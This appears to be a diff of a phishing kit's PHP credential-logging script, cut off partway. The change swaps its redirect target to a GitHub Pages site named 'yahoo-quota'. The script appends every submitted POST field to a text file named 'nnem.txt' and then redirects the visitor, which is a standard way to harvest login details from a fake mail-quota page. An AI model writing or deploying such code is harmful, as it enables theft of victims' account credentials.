@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://xyiuuprade.000webhostapp.com/');
+header ('Location:https://xzxyuz.github.io/yahoo-quota//');
 $handle = fopen("nnem.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
